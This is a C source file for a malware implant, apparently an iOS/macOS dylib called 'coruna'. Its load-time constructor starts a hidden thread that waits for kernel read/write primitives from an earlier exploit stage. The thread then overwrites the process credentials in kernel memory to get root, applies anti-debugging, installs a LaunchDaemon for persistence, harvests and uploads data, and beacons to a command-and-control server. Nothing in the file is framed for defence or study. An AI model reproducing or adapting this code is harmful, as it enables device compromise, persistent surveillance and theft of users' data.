#include "memory.h"
#include "offsets.h"
#include "injection.h"
#include "persistence.h"
#include "c2.h"
#include "stealth.h"
#include "data_harvest.h"
#include <pthread.h>
#include <unistd.h>

/* ── Privilege escalation (requires kernel r/w primitives) ─────────────────── */
static void elevate_to_root(void) {
    const KernelOffsets *off = get_kernel_offsets();
    if (!off) return;
    uint64_t kbase   = kernel_base();
    uint64_t allproc = kbase + off->allproc_offset;
    uint64_t self    = kread64(allproc);
    while (self) {
        pid_t pid = (pid_t)kread64(self + off->proc_p_pid);
        if (pid == getpid()) break;
        self = kread64(self + off->proc_p_list_next);
    }
    if (!self) return;
    uint64_t ucred = kread64(self + off->proc_p_ucred);
    kwrite64(ucred + off->ucred_cr_uid,   0);
    kwrite64(ucred + off->ucred_cr_ruid,  0);
    kwrite64(ucred + off->ucred_cr_svuid, 0);
    setuid(0); setgid(0);
}

/* ── Background implant entry point ────────────────────────────────────────── */
static void *implant_main(void *arg) {
    (void)arg;

    /*
     * Wait up to 5 s for Stage3 to call coruna_init_primitives() via dlsym.
     * dlopen() returns as soon as the constructor (below) detaches this thread,
     * so Stage3 can do: dlsym(lib,"coruna_init_primitives")(kread,kwrite,kbase)
     * and then this loop wakes up.
     */
    for (int i = 0; i < 50 && !kernel_base(); i++)
        usleep(100000); /* 50 × 100ms = 5 s max */

    if (kernel_base()) {
        /* Kernel primitives available — escalate privileges */
        apply_anti_debug();
        elevate_to_root();
        install_launchdaemon();
    }
    /* else: run without root — file reads still work for accessible paths */

    /* Harvest and upload all available data */
    harvest_all();

    /* Periodic heartbeat loop */
    while (1) {
        c2_heartbeat();
        sleep(30);
    }
    return NULL;
}

/* ── dylib constructor — runs synchronously at dlopen() time ───────────────── */
__attribute__((constructor))
void coruna_constructor(void) {
    /*
     * Immediately detach a worker thread so dlopen() returns right away.
     * Stage3 can then resolve and call coruna_init_primitives() before
     * the 5-second wait in implant_main() expires.
     */
    pthread_t tid;
    if (pthread_create(&tid, NULL, implant_main, NULL) == 0)
        pthread_detach(tid);
}
